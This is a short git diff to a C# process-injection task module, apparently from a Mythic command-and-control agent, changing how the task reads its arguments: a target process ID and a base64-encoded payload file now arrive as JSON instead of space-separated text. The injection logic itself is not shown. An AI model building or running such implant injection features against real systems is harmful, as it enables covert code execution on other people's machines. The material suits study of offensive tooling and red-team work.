@@ -1,4 +1,7 @@
-﻿using Models.Tasks;
+﻿using Extend;
+using Models.Tasks;
+using System;
+using System.Text;
 
 namespace Injection
 {
@@ -10,10 +13,11 @@ namespace Injection
         {
             MythicTaskResult result;
 
-            var FileBytes = new byte[10];
-            var Arguments = task.parameters.Split(' ');
+            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<RemoteInjectParam>();
 
-            if (!int.TryParse(Arguments[0], out var pid))
+            var FileBytes = Convert.FromBase64String(Arguments.file);
+
+            if (!int.TryParse(Arguments.pid, out var pid))
             {
                 result = new MythicTaskResult
                 {
@@ -54,6 +58,12 @@ namespace Injection
             }
 
             return result;
+        }
+
+        public class RemoteInjectParam
+        {
+            public string pid { get; set; }
+            public string file { get; set; }
         }
     }
 }
